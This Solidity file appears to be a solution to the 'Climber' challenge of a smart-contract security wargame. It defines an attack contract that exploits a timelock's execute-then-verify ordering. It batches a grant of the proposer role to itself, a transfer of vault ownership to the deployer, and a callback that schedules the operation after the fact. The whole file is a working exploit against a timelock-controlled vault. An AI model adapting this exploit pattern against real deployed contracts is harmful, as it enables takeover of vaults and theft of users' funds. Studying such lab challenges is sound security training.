// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import { ClimberTimelock } from "../../climber/ClimberVault.sol";

contract ClimberAttack {
    address payable private immutable timelock;

    address[] private _targets = new address[](3);
    uint256[] private _values = new uint256[](3);
    bytes[] private _elements = new bytes[](3);
    bytes32 private constant _salt = "anySalt";

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;

        _targets[0] = _timelock;
        _targets[1] = _vault;
        _targets[2] = address(this);

        _values[0] = 0;
        _values[1] = 0;
        _values[2] = 0;

        _elements[0] = (
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                ClimberTimelock(_timelock).PROPOSER_ROLE(),
                address(this)
            )
        );
        _elements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[2] = abi.encodeWithSignature("schedule()");
    }

    function attack() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, _salt);
    }

    function schedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, _salt);
    }
}
